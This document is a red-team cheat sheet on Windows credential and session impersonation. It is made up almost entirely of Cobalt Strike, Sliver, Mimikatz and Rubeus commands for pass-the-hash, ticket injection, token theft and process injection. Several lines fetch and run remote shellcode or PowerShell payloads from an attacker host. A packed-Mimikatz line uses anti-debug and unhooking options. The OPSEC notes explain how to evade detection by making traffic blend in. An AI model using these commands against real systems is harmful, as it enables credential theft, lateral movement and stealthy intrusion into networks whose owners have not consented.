## User and Session Impersonation

Techniques for assuming the identity of another user using their credential material (hashes, tickets, tokens, plaintext). These are the building blocks that enable lateral movement.

> [!Important]
> Most of these techniques require a high-integrity (elevated) beacon to obtain credential material in the first place — but not always to use it afterwards.

---

### Pass the Hash (PTH)

Authenticate to Windows services using the NTLM hash. CS runs Mimikatz in the background; the new credentials are passed over a named pipe that Beacon impersonates.

#### CS

```sh
beacon> getuid
beacon> pth <DOMAIN>\<user> <NTLM_HASH>
beacon> ls \\<target>\c$
beacon> rev2self
```

#### Sliver

```sh
# Via Mimikatz DLL injection
mimikatz '"privilege::debug" "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>" "exit"'

# Migrate into the spawned process
migrate -p <PID>

# Via PEZor (packed mimikatz)
PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /path/mimikatz.exe -z 2 -p '"privilege::debug" "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>" "exit"'
execute-assembly /path/mimikatz.exe.packed.dotnet.exe
migrate -p <PID>

# Via SharpNamedPipePTH — runs binary as target user
execute-assembly /path/SharpNamedPipePTH.exe username:<domain>\\<user> hash:<hash> binary:C:\\windows\\system32\\cmd.exe
ps -e cmd.exe
migrate -p <PID>

# Direct shell via SharpNamedPipePTH
execute-assembly /path/SharpNamedPipePTH.exe 'username:<domain>\\<user> hash:<hash> binary:"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" arguments:"-nop -w 1 -sta -enc <BASE64_PAYLOAD>"'
```

#### Manual

```sh
# Test access
nxc smb <target> -d <domain> -u <user> -H <hash>
nxc winrm <target> -d <domain> -u <user> -H <hash>

# Local admin PTH
nxc smb <subnet>/24 -d . -u Administrator -H <hash>
```

> [!Warning]
> Two detection opportunities: R/W handle to LSASS; and `echo foo > \\.\pipe\bar` pattern in command-line logs.

---

### Over Pass the Hash (Over-PTH)

Use a hash to request a Kerberos TGT. Prefer AES256 over NTLM to avoid generating RC4 tickets (anomalous in modern environments).

#### CS

```sh
# With NTLM hash (generates RC4 ticket — anomalous)
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<user> /ntlm:<hash> /nowrap

# With AES256 hash (preferred — blends in)
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<user> /aes256:<hash> /domain:DEV /opsec /nowrap

# Then use the TGT via PTT (see below)
```

#### Sliver

```sh
rubeus asktgt /user:<user> /ntlm:<hash>
rubeus -- asktgt /user:<user> /aes256:<hash> /domain:<domain> /opsec /nowrap
```

> [!Warning]
> NTLM hash → RC4 ticket (0x17). Shows up in "RC4 TGTs" saved search (4768 events with ticket encryption 0x17). `/opsec` flag sets Ticket Options to 0x40810010. Mimikatz `sekurlsa::pth` writes to LSASS; Rubeus avoids LSASS but generates anomalous Kerberos traffic.

---

### Pass the Ticket (PTT)

Add a TGT or TGS into a logon session. Create a sacrificial logon session first — don't inject into the current session (overwrites the existing TGT).

#### CS

```sh
# 1. Create a blank sacrificial logon session (use realistic-looking fake creds for OPSEC)
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<user> /password:FakePass123

# 2. Pass the ticket into the new LUID
beacon> execute-assembly C:\Tools\Rubeus.exe ptt /luid:<LUID> /ticket:<BASE64_TICKET>

# 3. Confirm with triage
beacon> execute-assembly C:\Tools\Rubeus.exe triage

# 4. Steal the token from the process created in step 1
beacon> steal_token <PID>

# Drop impersonation
beacon> rev2self
```

#### Sliver

```sh
rubeus triage
rubeus "dump /luid:0x3e4 /service:krbtgt /nowrap"
rubeus -- createnetonly /program:C:\\Windows\\System32\\cmd.exe
rubeus -- ptt /ticket:<TGT>
migrate -p <PID>
```

> [!Warning]
> By default Rubeus uses random fake credentials with `CreateProcessWithLogonW`, which appears in 4624 logon events. Use realistic-looking values for better OPSEC.

---

### Token Impersonation

Steal the token of a process belonging to another user. If they close the process, impersonation is lost — extract hashes/tickets for a more durable method.

#### CS

```sh
beacon> steal_token <PID>
beacon> rev2self
```

#### Sliver

```sh
# Preferred — try migrate first
migrate -p <PID>

# Fallback if migrate fails
execute-shellcode -S -r -I 30 -p <PID> /path/sliver.x64.bin

# SharpImpersonation — find process by user or list all
execute-assembly /path/SharpImpersonation.exe list
execute-assembly /path/SharpImpersonation.exe list wmi
execute-assembly /path/SharpImpersonation.exe user:<domain>\\<user> shellcode:http://<attacker>/sliver.x64.bin
execute-assembly /path/SharpImpersonation.exe pid:<PID> shellcode:http://<attacker>/sliver.x64.bin
```

---

### Make Token

Impersonate a user using their plaintext password. Uses `LOGON32_LOGON_NEW_CREDENTIALS` (LogonType 9) — applies only to outbound network connections, not local actions.

#### CS

```sh
beacon> make_token <DOMAIN>\<user> <password>
beacon> remote-exec winrm <target> whoami    # verify outbound auth
beacon> rev2self
```

#### Sliver

```sh
# Domain user
make-token -d <domain> -u <user> -p <password>

# Local user
make-token -d . -u Administrator -p <password>
```

> [!Warning]
> Generates EventID 4624 with LogonType 9 (LOGON32_LOGON_NEW_CREDENTIALS). Shows caller, impersonated user, process name and ID. Hard to distinguish from legitimate `runas /netonly`.

---

### Process Injection

Inject shellcode or a full Beacon payload into a target process. Elevated context allows injecting into processes owned by other users.

#### CS

```sh
# Inject a full Beacon payload
beacon> inject <PID> x64 <listener>

# Inject arbitrary shellcode from a file
beacon> shinject <PID> x64 /path/shellcode.bin

# Spawn a new process and inject shellcode
beacon> shspawn x64 /path/shellcode.bin
```

#### Sliver

```sh
# Inject shellcode into PID
execute-shellcode -S -r -I 30 -p <PID> /path/sliver.x64.bin
```

---

### Session Passing

Pass a session from one C2 framework to another. Useful for leveraging capabilities the current framework lacks, or establishing backup access.

#### CS → Other

```sh
# Spawn a new Beacon into a different listener
beacon> spawn x64 <listener>

# Foreign Listener (MSF staging protocol) — x86 only
beacon> spawn msf    # after creating Foreign HTTP listener in CS

# Inject MSF shellcode via shspawn
beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
```

> [!Important]
> Foreign listener supports only x86 staged payloads. For x64 stageless, use `shspawn` with a raw bin file.

---

### Rubeus createnetonly

Alternative to `make_token` — creates a process with specified credentials, then migrate/steal_token into it. Leaves no LSASS interaction.

#### CS

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<user> /password:<password>
beacon> steal_token <PID>
```

#### Sliver

```sh
rubeus -t 20 -- createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:<domain> /username:<user> /password:<password>
migrate -p <PID>
```

---

### runas (Sliver)

Run a process as another user — equivalent to `runas /netonly`.

```sh
runas -d <domain> -u <user> -P <password> -n -p C:\\Windows\\System32\\cmd.exe
runas -d . -u Administrator -P <password> -n -p C:\\Windows\\System32\\cmd.exe
ps -e cmd.exe
migrate -p <PID>

# Direct shell delivery
runas -d <domain> -u <user> -P <password> -n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc <BASE64_PAYLOAD>"
```

---

### $cred PSSession

PowerShell credential object for lateral movement or downloads.

```powershell
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("<domain>\<user>", $pass)
Start-Process powershell.exe -Credential $Cred -ArgumentList "-exec bypass -C `"IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/payload.txt')`""

# PowerShell remoting
New-PSSession -ComputerName <target> -Credential $Cred
```

---

> [!Note]
> **OPSEC summary:**
> - PTH: LSASS handle + named pipe pattern detectable
> - Over-PTH with NTLM: RC4 ticket anomaly (4768 events)
> - make_token / createnetonly: 4624 LogonType 9
> - AES keys preferred over NTLM for any Kerberos operation
> - `steal_token` is cleanest — no new auth events if process already exists
